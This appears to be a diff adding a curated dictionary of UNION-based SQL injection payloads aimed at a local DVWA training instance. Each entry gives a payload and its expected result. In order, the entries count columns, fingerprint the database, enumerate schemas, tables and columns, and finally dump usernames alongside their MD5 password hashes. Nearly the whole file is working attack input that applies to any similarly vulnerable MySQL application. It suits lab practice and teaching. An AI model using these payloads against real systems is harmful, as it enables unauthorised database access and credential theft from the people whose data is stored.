@@ -1,0 +1,44 @@
+# ==============================================================================
+# UNION-Based SQL Injection Payloads — Curated Dictionary
+# Target Scope: Local DVWA User Search (127.0.0.1:8080/vulnerabilities/sqli/?id=)
+# ==============================================================================
+
+# Context: Column enumeration trial 1 using ORDER BY.
+# Expected Result: Page loads normally if at least 1 column exists.
+1' ORDER BY 1 #
+
+# Context: Column enumeration trial 2 using ORDER BY.
+# Expected Result: Page loads normally if at least 2 columns exist (DVWA low returns 2 columns).
+1' ORDER BY 2 #
+
+# Context: Column enumeration trial 3 using ORDER BY.
+# Expected Result: Database error: "Unknown column '3' in 'order clause'" proving exactly 2 columns exist.
+1' ORDER BY 3 #
+
+# Context: In-band reflection test with matching column count (2 columns).
+# Expected Result: Numbers 1 and 2 echoed into 'First name' and 'Surname' fields on page.
+1' UNION SELECT 1, 2 #
+
+# Context: Database identification and current session user enumeration.
+# Expected Result: Outputs current database name (dvwa) and database user (dvwa@localhost).
+1' UNION SELECT database(), user() #
+
+# Context: Database management system version fingerprinting.
+# Expected Result: Displays MySQL/MariaDB version string (e.g. 8.0.36 or 10.4.x).
+1' UNION SELECT version(), @@version_comment #
+
+# Context: Database schema enumeration from information_schema.
+# Expected Result: Extracts distinct schema names available to the current user.
+1' UNION SELECT null, schema_name FROM information_schema.schemata #
+
+# Context: Table enumeration for current database.
+# Expected Result: Lists table names residing in the 'dvwa' database (e.g. users, guestbook).
+1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() #
+
+# Context: Column enumeration for the 'users' table.
+# Expected Result: Lists column names within the users table (user_id, first_name, last_name, user, password, avatar).
+1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' #
+
+# Context: Credential extraction concatenating user and password hash.
+# Expected Result: Dumps username alongside MD5 password hash from the users table.
+1' UNION SELECT null, CONCAT(user, 0x3a, password) FROM users #
